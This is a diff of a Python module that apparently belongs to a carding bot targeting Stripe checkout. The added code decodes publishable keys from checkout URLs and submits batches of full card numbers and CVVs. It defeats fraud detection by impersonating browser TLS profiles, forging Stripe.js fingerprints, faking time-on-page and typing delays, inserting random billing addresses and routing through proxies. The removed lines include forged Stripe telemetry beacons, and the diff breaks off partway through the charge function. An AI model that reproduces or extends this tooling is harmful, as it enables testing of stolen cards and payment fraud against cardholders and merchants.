@@ -1,539 +1,516 @@
 import re
+import time
 import random
-import string
-import uuid
 import asyncio
+import aiohttp
+import base64
+from urllib.parse import unquote, quote_plus
 
 from curl_cffi.requests import AsyncSession as CurlSession
 
-from utils.constants import USER_AGENTS, TLS_PROFILES, get_random_browser_profile
+from utils.constants import (
+    USER_AGENTS, TLS_PROFILES, BILLING_ADDRESSES, LIVE_DECLINE_CODES,
+    get_random_billing, get_currency_symbol, get_random_browser_profile,
+)
+from utils.stripe import (
+    get_stripe_headers, generate_stripe_fingerprints,
+    generate_eid, get_stripe_cookies, get_random_stripe_js_agent,
+)
+from utils.proxy import get_proxy_url
 
 
-# Per-user persistent fingerprints (muid stays same per machine)
-_user_fingerprints = {}
+def extract_checkout_url(text: str) -> str:
+    """Extract a Stripe checkout URL from text."""
+    patterns = [
+        r'https?://checkout\.stripe\.com/c/pay/cs_[^\s\"\'\<\>\)]+',
+        r'https?://checkout\.stripe\.com/[^\s\"\'\<\>\)]+',
+        r'https?://buy\.stripe\.com/[^\s\"\'\<\>\)]+',
+    ]
+    for p in patterns:
+        m = re.search(p, text, re.IGNORECASE)
+        if m:
+            url = m.group(0).rstrip('.,;:')
+            return url
+    return None
 
 
-def _detect_browser_info(ua: str) -> dict:
-    """Extract browser name, version, and platform from user agent string."""
-    info = {"browser": "Chrome", "version": "131", "platform": "Windows"}
-
-    # Detect platform
-    if "Macintosh" in ua or "Mac OS X" in ua:
-        info["platform"] = "macOS"
-    elif "Linux" in ua:
-        info["platform"] = "Linux"
-    else:
-        info["platform"] = "Windows"
-
-    # Detect browser + version
-    if "Edg/" in ua:
-        info["browser"] = "Edge"
-        m = re.search(r'Edg/(\d+)', ua)
-        if m: info["version"] = m.group(1)
-    elif "OPR/" in ua:
-        info["browser"] = "Opera"
-        m = re.search(r'Chrome/(\d+)', ua)
-        if m: info["version"] = m.group(1)
-    elif "Firefox/" in ua:
-        info["browser"] = "Firefox"
-        m = re.search(r'Firefox/(\d+)', ua)
-        if m: info["version"] = m.group(1)
-    elif "Safari/" in ua and "Chrome" not in ua:
-        info["browser"] = "Safari"
-        m = re.search(r'Version/(\d+)', ua)
-        if m: info["version"] = m.group(1)
-    else:
-        info["browser"] = "Chrome"
-        m = re.search(r'Chrome/(\d+)', ua)
-        if m: info["version"] = m.group(1)
-
-    return info
-
-
-def get_stripe_headers() -> dict:
-    """Minimal Stripe-specific headers for use with curl_cffi impersonate.
-    Browser headers (UA, sec-ch-ua, etc) are auto-set by curl_cffi."""
-    return {
-        "accept": "application/json",
-        "content-type": "application/x-www-form-urlencoded",
-        "origin": "https://checkout.stripe.com",
-        "referer": "https://checkout.stripe.com/",
-        "sec-fetch-dest": "empty",
-        "sec-fetch-mode": "cors",
-        "sec-fetch-site": "same-site",
-    }
-
-
-def get_headers(stripe_js: bool = False) -> dict:
-    """Return headers mimicking Stripe.js browser requests."""
-    ua = random.choice(USER_AGENTS)
-    headers = {
-        "accept": "application/json",
-        "content-type": "application/x-www-form-urlencoded",
-        "origin": "https://checkout.stripe.com",
-        "referer": "https://checkout.stripe.com/",
-        "user-agent": ua
-    }
-    if stripe_js:
-        browser = _detect_browser_info(ua)
-        v = browser["version"]
-        platform = browser["platform"]
-
-        headers["accept-language"] = random.choice([
-            "en-US,en;q=0.9",
-            "en-US,en;q=0.9,id;q=0.8",
-            "en-GB,en;q=0.9,en-US;q=0.8",
-            "en-US,en;q=0.9,nl;q=0.8",
-            "en-US,en;q=0.9,de;q=0.8",
-            "en-US,en;q=0.9,fr;q=0.8",
-            "en-US,en;q=0.9,ja;q=0.8",
-        ])
-        headers["sec-fetch-dest"] = "empty"
-        headers["sec-fetch-mode"] = "cors"
-        headers["sec-fetch-site"] = "same-site"
-
-        # Dynamic sec-ch-ua based on actual browser
-        if browser["browser"] in ("Chrome", "Edge", "Opera"):
-            not_a_brands = [
-                '"Not(A:Brand";v="24"',
-                '"Not_A Brand";v="8"',
-                '"Not/A)Brand";v="8"',
-                '"Not A(Brand";v="99"',
-                '"Not)A;Brand";v="99"',
-            ]
-            not_a = random.choice(not_a_brands)
-            if browser["browser"] == "Edge":
-                headers["sec-ch-ua"] = f'"Chromium";v="{v}", {not_a}, "Microsoft Edge";v="{v}"'
-            elif browser["browser"] == "Opera":
-                headers["sec-ch-ua"] = f'"Chromium";v="{v}", {not_a}, "Opera";v="{v}"'
-            else:
-                headers["sec-ch-ua"] = f'"Chromium";v="{v}", {not_a}, "Google Chrome";v="{v}"'
-            headers["sec-ch-ua-mobile"] = "?0"
-            headers["sec-ch-ua-platform"] = f'"{platform}"'
-        # Firefox/Safari don't send sec-ch-ua
-
-    return headers
-
-import hashlib
-import aiohttp
-
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-#  Real Stripe.js hash scraping from CDN
-# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-_cached_stripe_hashes = {
-    "core": None,     # stripe.js main bundle hash
-    "v3": None,       # stripe-js-v3 module hash
-    "fetched": False, # whether we've attempted fetch
-}
-
-
-async def fetch_stripe_js_hashes():
-    """Fetch real Stripe.js from CDN and extract build hashes.
-    
-    Should be called once at bot startup. Extracts fingerprint hashes
-    from the webpack bundle's 'fingerprinted/js/' asset paths, which
-    are the same hashes Stripe uses to identify legitimate JS clients.
-    """
-    global _cached_stripe_hashes
-    
-    if _cached_stripe_hashes["fetched"]:
-        return
-    
-    _cached_stripe_hashes["fetched"] = True
-    
+async def fetch_pk_from_page(url: str) -> str:
+    """Fetch checkout page HTML and extract PK via regex (fallback method)."""
     try:
         async with aiohttp.ClientSession() as session:
-            async with session.get(
-                "https://js.stripe.com/v3/",
-                headers={
-                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
-                    "Accept": "*/*",
-                },
-                timeout=aiohttp.ClientTimeout(total=15),
-                ssl=False,
-            ) as resp:
-                if resp.status != 200:
-                    print(f"[DEBUG] Stripe.js fetch failed: HTTP {resp.status}")
-                    return
-                
-                content = await resp.text()
-                
-                # Extract fingerprint hashes from the webpack bundle
-                # Real Stripe.js contains paths like: fingerprinted/js/MODULE-HASH.js
-                js_hashes = re.findall(
-                    r'fingerprinted/js/[a-zA-Z0-9_-]+-([a-f0-9]{20,40})\.js',
-                    content
-                )
-                
-                if js_hashes:
-                    # Use first two distinct hashes for core and v3
-                    unique_hashes = list(dict.fromkeys(js_hashes))
-                    _cached_stripe_hashes["core"] = unique_hashes[0][:10]
-                    if len(unique_hashes) > 1:
-                        _cached_stripe_hashes["v3"] = unique_hashes[1][:10]
-                    else:
-                        _cached_stripe_hashes["v3"] = unique_hashes[0][:10]
-                    
-                    print(f"[DEBUG] ✅ Stripe.js real hashes scraped: "
-                          f"core={_cached_stripe_hashes['core']}, "
-                          f"v3={_cached_stripe_hashes['v3']} "
-                          f"(from {len(unique_hashes)} unique hashes)")
-                else:
-                    # Fallback: derive hash from content itself
-                    content_hash = hashlib.sha256(content.encode()).hexdigest()
-                    _cached_stripe_hashes["core"] = content_hash[:10]
-                    _cached_stripe_hashes["v3"] = content_hash[10:20]
-                    print(f"[DEBUG] ⚠️ No fingerprint paths found, using content hash: "
-                          f"core={_cached_stripe_hashes['core']}, "
-                          f"v3={_cached_stripe_hashes['v3']}")
-                    
+            async with session.get(url, headers={
+                "User-Agent": random.choice(USER_AGENTS),
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                "Accept-Language": "en-US,en;q=0.5"
+            }, timeout=aiohttp.ClientTimeout(total=15),
+            allow_redirects=True, ssl=False) as resp:
+                if resp.status == 200:
+                    html = await resp.text()
+                    pk_patterns = [
+                        r'pk_(live|test)_[A-Za-z0-9]{20,}',
+                        r'"apiKey"\s*:\s*"(pk_(?:live|test)_[A-Za-z0-9]+)"',
+                        r'"publishableKey"\s*:\s*"(pk_(?:live|test)_[A-Za-z0-9]+)"',
+                        r'Stripe\(["\']?(pk_(?:live|test)_[A-Za-z0-9]+)["\']?\)',
+                    ]
+                    for pattern in pk_patterns:
+                        pk_match = re.search(pattern, html)
+                        if pk_match:
+                            pk = pk_match.group(1) if pk_match.lastindex else pk_match.group(0)
+                            if pk.startswith('pk_'):
+                                print(f"[DEBUG] PK extracted from page HTML: {pk[:20]}...")
+                                return pk
     except Exception as e:
-        print(f"[DEBUG] ❌ Stripe.js hash fetch error: {str(e)[:80]}")
+        print(f"[DEBUG] fetch_pk_from_page error: {str(e)[:50]}")
+    return None
 
 
-def get_random_stripe_js_agent() -> str:
-    """Get Stripe.js payment_user_agent using real CDN hashes when available."""
-    core = _cached_stripe_hashes.get("core")
-    v3 = _cached_stripe_hashes.get("v3")
-    
-    if not core or not v3:
-        # Last resort fallback — should rarely happen if fetch_stripe_js_hashes() was called
-        core = hashlib.sha256(f"stripe-core-{random.randint(0,9999)}".encode()).hexdigest()[:10]
-        v3 = hashlib.sha256(f"stripe-v3-{random.randint(0,9999)}".encode()).hexdigest()[:10]
-        print(f"[DEBUG] ⚠️ Using generated hashes (CDN not fetched yet)")
-    
-    return f"stripe.js%2F{core}%3B+stripe-js-v3%2F{v3}%3B+checkout"
+async def decode_pk_from_url(url: str) -> dict:
+    """Extract PK, CS, and site from a Stripe checkout URL."""
+    result = {"pk": None, "cs": None, "site": None}
 
-
-def _rand_hex(length: int) -> str:
-    return ''.join(random.choices(string.hexdigits[:16], k=length))
-
-
-def _uuid_format() -> str:
-    return f"{_rand_hex(8)}-{_rand_hex(4)}-4{_rand_hex(3)}-{random.choice('89ab')}{_rand_hex(3)}-{_rand_hex(12)}"
-
-
-def generate_stripe_fingerprints(user_id: int = None) -> dict:
-    """Generate Stripe.js fingerprint identifiers.
-    muid is persistent per user (like browser cookies).
-    guid is per-page-load. sid is per-session."""
-
-    # muid persistent per user (simulates __stripe_mid cookie)
-    if user_id and user_id in _user_fingerprints:
-        muid = _user_fingerprints[user_id]
-    else:
-        muid = _uuid_format()
-        if user_id:
-            _user_fingerprints[user_id] = muid
-
-    # guid = per page load, sid = per session
-    guid = _uuid_format()
-    sid = _uuid_format()
-
-    return {"muid": muid, "guid": guid, "sid": sid}
-
-
-def generate_eid() -> str:
-    """Generate a valid UUID v4 for the eid parameter."""
-    return str(uuid.uuid4())
-
-
-def get_stripe_cookies(fp: dict, real_cookies: dict = None) -> str:
-    """Generate Stripe cookie header — uses real cookies from warm session if available."""
-    mid = real_cookies.get("__stripe_mid", fp['muid']) if real_cookies else fp['muid']
-    sid = real_cookies.get("__stripe_sid", fp['sid']) if real_cookies else fp['sid']
-    
-    cookie_str = f"__stripe_mid={mid}; __stripe_sid={sid}"
-    
-    # Include any extra cookies from warm session
-    if real_cookies:
-        for k, v in real_cookies.items():
-            if k not in ("__stripe_mid", "__stripe_sid"):
-                cookie_str += f"; {k}={v}"
-    
-    return cookie_str
-
-
-async def warm_checkout_session(checkout_url: str, tls_profile: str, user_agent: str, proxy: str = None) -> dict:
-    """Fetch checkout page to collect real Stripe cookies and establish session.
-    
-    Real browsers always load the checkout page first before making API calls.
-    This step gets real __stripe_mid/__stripe_sid cookies from Stripe's servers.
-    
-    Returns dict with:
-        - cookies: dict of cookie name -> value from Set-Cookie headers
-        - success: whether the page was loaded successfully
-    """
-    result = {"cookies": {}, "success": False}
-    
     try:
-        async with CurlSession(impersonate=tls_profile) as s:
-            r = await s.get(
-                checkout_url,
-                headers={
-                    "user-agent": user_agent,
-                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-                    "accept-language": "en-US,en;q=0.9",
-                    "sec-fetch-dest": "document",
-                    "sec-fetch-mode": "navigate",
-                    "sec-fetch-site": "none",
-                    "sec-fetch-user": "?1",
-                    "upgrade-insecure-requests": "1",
-                },
-                timeout=15,
-                allow_redirects=True,
-                proxy=proxy,
-            )
-            
-            # Debug: show raw Set-Cookie headers
-            print(f"[DEBUG] Warm response status: {r.status_code}")
+        cs_match = re.search(r'cs_(live|test)_[A-Za-z0-9]+', url)
+        if cs_match:
+            result["cs"] = cs_match.group(0)
+
+        # Method 1: Decode from hash fragment (XOR decode)
+        if '#' in url:
+            hash_part = url.split('#')[1]
+            hash_decoded = unquote(hash_part)
+
             try:
-                all_headers = dict(r.headers) if hasattr(r.headers, '__iter__') else {}
-                set_cookie_raw = [v for k, v in all_headers.items() if k.lower() == 'set-cookie']
-                print(f"[DEBUG] Raw Set-Cookie: {set_cookie_raw[:3]}")
-            except Exception:
-                pass
-            
-            # Strategy 1: Extract from cookies jar
-            try:
-                if hasattr(r, 'cookies') and r.cookies:
-                    for name in r.cookies.keys():
-                        result["cookies"][name] = r.cookies.get(name, "")
-            except Exception:
-                pass
-            
-            # Strategy 2: Extract from session cookies
-            try:
-                if hasattr(s, 'cookies') and s.cookies:
-                    for name in s.cookies.keys():
-                        result["cookies"][name] = s.cookies.get(name, "")
-            except Exception:
-                pass
-            
-            # Strategy 3: Parse Set-Cookie from raw headers
-            try:
-                raw_headers = str(r.headers) if hasattr(r, 'headers') else ""
-                # curl_cffi headers — try multiple methods
-                if hasattr(r.headers, 'multi_items'):
-                    for name, value in r.headers.multi_items():
-                        if name.lower() == "set-cookie":
-                            parts = value.split(";")[0].strip()
-                            if "=" in parts:
-                                k, v = parts.split("=", 1)
-                                result["cookies"][k.strip()] = v.strip()
-                elif hasattr(r.headers, 'items'):
-                    for name, value in r.headers.items():
-                        if name.lower() == "set-cookie":
-                            parts = value.split(";")[0].strip()
-                            if "=" in parts:
-                                k, v = parts.split("=", 1)
-                                result["cookies"][k.strip()] = v.strip()
-            except Exception:
-                pass
-            
-            # Strategy 4: Look for stripe cookies in response body (JS sets them)
-            if not result["cookies"] and r.status_code == 200:
-                try:
-                    body = r.text
-                    import re
-                    # Find __stripe_mid and __stripe_sid in the HTML/JS
-                    for cookie_name in ["__stripe_mid", "__stripe_sid"]:
-                        match = re.search(rf'{cookie_name}["\s]*[=:]["\s]*([a-f0-9-]+)', body)
-                        if match:
-                            result["cookies"][cookie_name] = match.group(1)
-                except Exception:
-                    pass
-            
-            if r.status_code == 200:
-                result["success"] = True
-                print(f"[DEBUG] ✅ Warm session OK — got {len(result['cookies'])} cookies: {list(result['cookies'].keys())}")
-            else:
-                print(f"[DEBUG] ⚠️ Warm session HTTP {r.status_code}")
-                result["success"] = True  # Still usable
-                
+                padded = hash_decoded + '=' * (-len(hash_decoded) % 4)
+                decoded_bytes = base64.b64decode(padded)
+                xored = ''.join(chr(b ^ 5) for b in decoded_bytes)
+
+                pk_match = re.search(r'pk_(live|test)_[A-Za-z0-9]+', xored)
+                if pk_match:
+                    result["pk"] = pk_match.group(0)
+                    print(f"[DEBUG] PK decoded from hash: {result['pk'][:20]}...")
+
+                site_match = re.search(r'https?://[^\s\"\'\'<>]+', xored)
+                if site_match:
+                    result["site"] = site_match.group(0)
+            except (ValueError, Exception) as e:
+                print(f"[DEBUG] Hash decode error: {str(e)[:40]}")
+
+        # Method 2: Fallback — fetch page HTML and extract PK
+        if not result["pk"] and result["cs"]:
+            print(f"[DEBUG] Hash decode failed/missing, trying page fetch fallback...")
+            pk_from_page = await fetch_pk_from_page(url)
+            if pk_from_page:
+                result["pk"] = pk_from_page
+
     except Exception as e:
-        print(f"[DEBUG] ❌ Warm session error: {str(e)[:60]}")
-    
+        print(f"[DEBUG] decode_pk_from_url error: {str(e)[:50]}")
+
     return result
 
 
-async def send_m_stripe_beacon(fp: dict, checkout_url: str, tls_profile: str, user_agent: str, cookies_str: str, proxy: str = None) -> bool:
-    """Send multiple telemetry beacons to m.stripe.com/6 like real Stripe.js.
+async def get_checkout_info(url: str, tls_profile: str = None, user_agent: str = None, proxy: str = None, cookies_str: str = None) -> dict:
+    """Get full checkout info from a Stripe checkout URL.
     
-    Real Stripe.js sends 5+ beacons throughout page lifecycle.
+    Args:
+        tls_profile: TLS profile to use (for consistency with confirm)
+        user_agent: User-Agent to use (for consistency with confirm)
+        proxy: Proxy URL to use (for consistency with confirm)
+        cookies_str: Real Stripe cookies from warm session
     """
-    import json
-    import time
-    
-    beacon_headers = {
-        "user-agent": user_agent,
-        "content-type": "application/json",
-        "origin": "https://checkout.stripe.com",
-        "referer": "https://checkout.stripe.com/",
-        "sec-fetch-dest": "empty",
-        "sec-fetch-mode": "cors",
-        "sec-fetch-site": "same-site",
-        "cookie": cookies_str,
+    start = time.perf_counter()
+    result = {
+        "url": url,
+        "pk": None,
+        "cs": None,
+        "merchant": None,
+        "price": None,
+        "currency": None,
+        "product": None,
+        "country": None,
+        "mode": None,
+        "customer_name": None,
+        "customer_email": None,
+        "support_email": None,
+        "support_phone": None,
+        "cards_accepted": None,
+        "success_url": None,
+        "cancel_url": None,
+        "init_data": None,
+        "pi_id": None,
+        "pi_client_secret": None,
+        "error": None,
+        "time": 0
     }
-    
-    now = int(time.time() * 1000)
-    
-    # Multiple beacons matching real Stripe.js lifecycle
-    beacons = [
-        {
-            "v": 2,
-            "tag": "checkout_init_pageload",
-            "src": "checkout-js",
-            "pid": fp["guid"],
-            "data": {
-                "url": checkout_url,
-                "muid": fp["muid"],
-                "sid": fp["sid"],
-                "pageloadTimestamp": now,
-                "livemode": True,
-                "userAgent": user_agent,
-            }
-        },
-        {
-            "v": 2,
-            "tag": "checkout_init_loaded",
-            "src": "checkout-js",
-            "pid": fp["guid"],
-            "data": {
-                "url": checkout_url,
-                "muid": fp["muid"],
-                "sid": fp["sid"],
-                "loadTimestamp": now + random.randint(800, 2000),
-                "livemode": True,
-            }
-        },
-        {
-            "v": 2,
-            "tag": "payment_element_loaded",
-            "src": "checkout-js",
-            "pid": fp["guid"],
-            "data": {
-                "url": checkout_url,
-                "muid": fp["muid"],
-                "sid": fp["sid"],
-                "elementTimestamp": now + random.randint(2000, 4000),
-                "livemode": True,
-                "type": "card",
-            }
-        },
-        {
-            "v": 2,
-            "tag": "checkout_contact_info_rendered",
-            "src": "checkout-js",
-            "pid": fp["guid"],
-            "data": {
-                "url": checkout_url,
-                "muid": fp["muid"],
-                "sid": fp["sid"],
-                "renderTimestamp": now + random.randint(2500, 4500),
-                "livemode": True,
-                "hasEmail": True,
-            }
-        },
-        {
-            "v": 2,
-            "tag": "checkout_payment_form_interacted",
-            "src": "checkout-js",
-            "pid": fp["guid"],
-            "data": {
-                "url": checkout_url,
-                "muid": fp["muid"],
-                "sid": fp["sid"],
-                "interactionTimestamp": now + random.randint(4000, 7000),
-                "livemode": True,
-                "fieldType": "cardNumber",
-            }
-        },
-    ]
-    
-    sent = 0
-    collected_cookies = {}
+
     try:
-        async with CurlSession(impersonate=tls_profile) as s:
-            for beacon in beacons:
-                try:
-                    r = await s.post(
-                        "https://m.stripe.com/6",
-                        headers=beacon_headers,
-                        data=json.dumps(beacon),
-                        timeout=8,
-                        proxy=proxy,
-                    )
-                    sent += 1
-                    # Extract cookies from beacon response
-                    try:
-                        if hasattr(r, 'cookies') and r.cookies:
-                            for name in r.cookies.keys():
-                                collected_cookies[name] = r.cookies.get(name, "")
-                    except Exception:
-                        pass
-                except Exception:
-                    pass
-                await asyncio.sleep(random.uniform(0.1, 0.3))
-            
-            # Also check session cookies
-            try:
-                if hasattr(s, 'cookies') and s.cookies:
-                    for name in s.cookies.keys():
-                        collected_cookies[name] = s.cookies.get(name, "")
-            except Exception:
-                pass
-        
-        if collected_cookies:
-            print(f"[DEBUG] ✅ Beacon cookies: {list(collected_cookies.keys())}")
-        print(f"[DEBUG] ✅ m.stripe.com beacons sent: {sent}/{len(beacons)}")
-        return sent > 0, collected_cookies
-            
+        decoded = await decode_pk_from_url(url)
+        result["pk"] = decoded.get("pk")
+        result["cs"] = decoded.get("cs")
+
+        if result["pk"] and result["cs"]:
+            # Use provided TLS profile or fallback to random
+            bp = get_random_browser_profile()
+            init_tls = tls_profile or bp['tls']
+            eid = generate_eid()
+            result["eid"] = eid  # Save for reuse in confirm
+            body = f"key={result['pk']}&eid={eid}&browser_locale=en-US&redirect_type=url"
+
+            headers = get_stripe_headers()
+            if user_agent:
+                headers["user-agent"] = user_agent
+            if cookies_str:
+                headers["cookie"] = cookies_str
+
+            async with CurlSession(impersonate=init_tls) as s:
+                r = await s.post(
+                    f"https://api.stripe.com/v1/payment_pages/{result['cs']}/init",
+                    headers=headers,
+                    data=body,
+                    proxy=proxy,
+                    timeout=20
+                )
+                init_data = r.json()
+
+            if "error" not in init_data:
+                result["init_data"] = init_data
+                result["api_version"] = init_data.get("api_version", "2025-02-24.acacia")
+
+                acc = init_data.get("account_settings", {})
+                result["merchant"] = acc.get("display_name") or acc.get("business_name")
+                result["support_email"] = acc.get("support_email")
+                result["support_phone"] = acc.get("support_phone")
+                result["country"] = acc.get("country")
+
+                lig = init_data.get("line_item_group")
+                inv = init_data.get("invoice")
+                if lig:
+                    result["price"] = lig.get("total", 0) / 100
+                    result["currency"] = lig.get("currency", "").upper()
+                    if lig.get("line_items"):
+                        items = lig["line_items"]
+                        currency = lig.get("currency", "").upper()
+                        sym = get_currency_symbol(currency)
+                        product_parts = []
+                        for item in items:
+                            qty = item.get("quantity", 1)
+                            name = item.get("name", "Product")
+                            amt = item.get("amount", 0) / 100
+                            interval = item.get("recurring_interval")
+                            if interval:
+                                product_parts.append(f"{qty} × {name} (at {sym}{amt:.2f} / {interval})")
+                            else:
+                                product_parts.append(f"{qty} × {name} ({sym}{amt:.2f})")
+                        result["product"] = ", ".join(product_parts)
+                elif inv:
+                    result["price"] = inv.get("total", 0) / 100
+                    result["currency"] = inv.get("currency", "").upper()
+
+                mode = init_data.get("mode", "")
+                if mode:
+                    result["mode"] = mode.upper()
+                elif init_data.get("subscription"):
+                    result["mode"] = "SUBSCRIPTION"
+                else:
+                    result["mode"] = "PAYMENT"
+
+                cust = init_data.get("customer") or {}
+                result["customer_name"] = cust.get("name")
+                result["customer_email"] = init_data.get("customer_email") or cust.get("email")
+
+                pm_types = init_data.get("payment_method_types") or []
+                if pm_types:
+                    cards = [t.upper() for t in pm_types if t != "card"]
+                    if "card" in pm_types:
+                        cards.insert(0, "CARD")
+                    result["cards_accepted"] = ", ".join(cards) if cards else "CARD"
+
+                result["success_url"] = init_data.get("success_url")
+                result["cancel_url"] = init_data.get("cancel_url")
+
+                # Extract PaymentIntent info for direct confirm flow
+                pi_obj = init_data.get("payment_intent") or {}
+                if pi_obj.get("id"):
+                    result["pi_id"] = pi_obj["id"]
+                    result["pi_client_secret"] = pi_obj.get("client_secret", "")
+                    print(f"[DEBUG] PaymentIntent: {result['pi_id'][:20]}...")
+            else:
+                result["error"] = init_data.get("error", {}).get("message", "Init failed")
+        else:
+            result["error"] = "Could not decode PK/CS from URL"
+
     except Exception as e:
-        print(f"[DEBUG] ⚠️ Beacon error (non-fatal): {str(e)[:50]}")
-        return False, {}
+        result["error"] = str(e)
+        print(f"[DEBUG] get_checkout_info error: {str(e)[:50]}")
+
+    result["time"] = round(time.perf_counter() - start, 2)
+    return result
 
 
-def generate_session_context(user_id: int = None) -> dict:
-    """Generate a complete session context for one checkout session.
+
+async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, user_id: int = None, max_retries: int = 2, session_ctx: dict = None, card_index: int = 0) -> dict:
+    """Charge card using Stripe.js emulation — direct confirm with fingerprints.
     
-    This should be called ONCE per checkout session and reused for ALL
-    card attempts. Mimics a real user opening checkout in one browser.
-    
-    Returns dict with:
-        - tls_profile: browser TLS profile (same browser for all cards)
-        - fingerprints: muid/guid/sid (same page load for all cards)
-        - cookies: stripe cookie header
-        - payment_user_agent: stripe.js agent string
-        - pasted_fields: which fields were pasted
-        - time_on_page_base: base time user spent on page (increases per card)
+    Args:
+        session_ctx: Session context from generate_session_context(). 
+                     If provided, uses consistent TLS/fingerprints for the whole session.
+        card_index: Index of this card in the batch (0-based), used for time_on_page.
     """
-    # Pick ONE browser for the entire session — TLS + UA always matched
-    browser = get_random_browser_profile()
-    tls_profile = browser["tls"]
-    user_agent = browser["ua"]
-
-    # Generate fingerprints ONCE (guid+sid stay same for all cards in session)
-    fp = generate_stripe_fingerprints(user_id)
-
-    # Cookies stay same for session
-    cookies = get_stripe_cookies(fp)
-
-    # Payment user agent stays same for session
-    payment_user_agent = get_random_stripe_js_agent()
-
-    # Randomize pasted_fields (some users type, some paste)
-    pasted_fields = random.choice(["number", "number|cvc", "number|cvc|exp", ""])
-
-    # Base time on page — starts at 20-60s, will increase per card
-    time_on_page_base = random.randint(20000, 60000)
-
-    return {
-        "tls_profile": tls_profile,
-        "user_agent": user_agent,
-        "fingerprints": fp,
-        "cookies": cookies,
-        "payment_user_agent": payment_user_agent,
-        "pasted_fields": pasted_fields,
-        "time_on_page_base": time_on_page_base,
+    start = time.perf_counter()
+    card_display = f"{card['cc'][:6]}****{card['cc'][-4:]}"
+    result = {
+        "card": f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}",
+        "status": None,
+        "response": None,
+        "time": 0
     }
+
+    pk = checkout_data.get("pk")
+    cs = checkout_data.get("cs")
+    init_data = checkout_data.get("init_data")
+
+    if not pk or not cs or not init_data:
+        result["status"] = "FAILED"
+        result["response"] = "No checkout data"
+        result["time"] = round(time.perf_counter() - start, 2)
+        return result
+
+    print(f"\n[DEBUG] Card: {card_display}")
+
+    # Use session context if provided, otherwise fallback to per-card generation
+    if session_ctx:
+        profile = session_ctx["tls_profile"]
+        fp = session_ctx["fingerprints"]
+        stripe_cookies = session_ctx["cookies"]
+        pua = session_ctx["payment_user_agent"]
+        pasted = session_ctx["pasted_fields"]
+        # Time on page increases naturally per card (user spends more time)
+        time_on_page = session_ctx["time_on_page_base"] + (card_index * random.randint(3000, 8000))
+    else:
+        from utils.stripe import generate_session_context as _gen_ctx
+        _ctx = _gen_ctx(user_id)
+        profile = _ctx["tls_profile"]
+        fp = _ctx["fingerprints"]
+        stripe_cookies = _ctx["cookies"]
+        pua = _ctx["payment_user_agent"]
+        pasted = _ctx["pasted_fields"]
+        time_on_page = _ctx["time_on_page_base"]
+
+    for attempt in range(max_retries + 1):
+        try:
+            proxy_url = get_proxy_url(proxy_str) if proxy_str else None
+            async with CurlSession(impersonate=profile) as s:
+                email = init_data.get("customer_email") or "john@example.com"
+                checksum = init_data.get("init_checksum", "")
+
+                lig = init_data.get("line_item_group")
+                inv = init_data.get("invoice")
+                if lig:
+                    total, subtotal = lig.get("total", 0), lig.get("subtotal", 0)
+                elif inv:
+                    total, subtotal = inv.get("total", 0), inv.get("subtotal", 0)
+                else:
+                    pi = init_data.get("payment_intent") or {}
+                    total = subtotal = pi.get("amount", 0)
+
+                cust = init_data.get("customer") or {}
+                addr = cust.get("address") or {}
+
+                # Use customer data if available, otherwise random billing
+                if cust.get("name") or addr.get("line1"):
+                    name = cust.get("name") or "John Smith"
+                    country = addr.get("country") or "US"
+                    line1 = addr.get("line1") or "742 Evergreen Terrace"
+                    city = addr.get("city") or "Springfield"
+                    state = addr.get("state") or "IL"
+                    zip_code = addr.get("postal_code") or "62704"
+                else:
+                    billing = get_random_billing()
+                    name = billing["name"]
+                    country = billing["country"]
+                    line1 = billing["line1"]
+                    city = billing["city"]
+                    state = billing["state"]
+                    zip_code = billing["zip"]
+
+                if attempt > 0:
+                    print(f"[DEBUG] Retry attempt {attempt}...")
+
+                # Reuse eid from init for first card (browser behavior)
+                # Only generate new eid for retry/subsequent cards
+                if card_index == 0:
+                    eid = checkout_data.get("eid") or generate_eid()
+                else:
+                    eid = generate_eid()
+
+                # Realistic delay before confirm — mimic user typing card details
+                # First card: longer (reading page), subsequent: faster
+                if card_index == 0:
+                    await asyncio.sleep(random.uniform(2.0, 4.5))
+                else:
+                    await asyncio.sleep(random.uniform(0.8, 2.0))
+
+                print(f"[DEBUG] TLS Profile: {profile} | Confirming with fingerprints...")
+
+                # Build confirm body — Stripe.js style
+                conf_body = (
+                    f"eid={eid}"
+                    f"&payment_method_data[type]=card"
+                    f"&payment_method_data[card][number]={card['cc']}"
+                    f"&payment_method_data[card][cvc]={card['cvv']}"
+                    f"&payment_method_data[card][exp_month]={card['month']}"
+                    f"&payment_method_data[card][exp_year]={card['year']}"
+                    f"&payment_method_data[billing_details][name]={name}"
+                    f"&payment_method_data[billing_details][email]={email}"
+                    f"&payment_method_data[billing_details][address][country]={country}"
+                    f"&payment_method_data[billing_details][address][line1]={line1}"
+                    f"&payment_method_data[billing_details][address][city]={city}"
+                    f"&payment_method_data[billing_details][address][postal_code]={zip_code}"
+                    f"&payment_method_data[billing_details][address][state]={state}"
+                    f"&payment_method_data[guid]={fp['guid']}"
+                    f"&payment_method_data[muid]={fp['muid']}"
+                    f"&payment_method_data[sid]={fp['sid']}"
+                    f"&payment_method_data[payment_user_agent]={pua}"
+                    f"&payment_method_data[time_on_page]={time_on_page}"
+                )
+                # Add pasted_fields only if not empty
+                if pasted:
+                    conf_body += f"&payment_method_data[pasted_fields]={pasted}"
+                # Add referrer — real Stripe.js always sends this
+                checkout_url = checkout_data.get("url", "https://checkout.stripe.com")
+                conf_body += f"&payment_method_data[referrer]={checkout_url}"
+                conf_body += (
+                    f"&expected_amount={total}"
+                    f"&last_displayed_line_item_group_details[subtotal]={subtotal}"
+                    f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
+                    f"&last_displayed_line_item_group_details[total_inclusive_tax]=0"
+                    f"&last_displayed_line_item_group_details[total_discount_amount]=0"
+                    f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
+                    f"&expected_payment_method_type=card"
+                    f"&key={pk}"
+                    f"&init_checksum={checksum}"
+                    f"&_stripe_version={checkout_data.get('api_version', '2025-02-24.acacia')}"
+                )
+
+                # Use curl_cffi headers + matched UA + cookies
